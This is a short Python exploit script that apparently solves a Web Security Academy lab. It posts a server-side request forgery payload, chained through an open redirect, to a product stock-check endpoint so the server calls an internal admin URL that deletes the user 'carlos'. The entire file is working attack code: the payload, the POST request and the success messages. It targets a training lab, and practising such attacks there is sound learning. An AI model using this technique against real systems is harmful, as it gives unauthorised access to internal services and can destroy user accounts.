# === Standard Library ===
import time

# === Third-Party ===
try:
    import requests
except ImportError:
    raise ImportError("Install 'requests' with: pip install requests")

# === User Config ===
BASE_URL = "https://0a6d008a04c25b0280ba0dfe00520040.web-security-academy.net"
REDIRECT_PAYLOAD = "/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos"
FULL_URL = f"{BASE_URL}/product/stock"
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False

# === Exploit Function ===
def execute_open_redirect_bypass():
    data = f"stockApi={REDIRECT_PAYLOAD}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print(f"[*] Sending SSRF via Open Redirect: {REDIRECT_PAYLOAD}")
    res = requests.post(
        FULL_URL,
        data=data,
        headers=headers,
        proxies=PROXY if USE_PROXY else None
    )

    if res.status_code == 200:
        print("[+] Payload delivered successfully.")
        print("[*] Check the lab UI. Carlos should be gone.")
    else:
        print(f"[-] Failed. Status Code: {res.status_code}")

# === Main ===
if __name__ == "__main__":
    print("[*] Launching SSRF with Open Redirect Bypass...")
    execute_open_redirect_bypass()
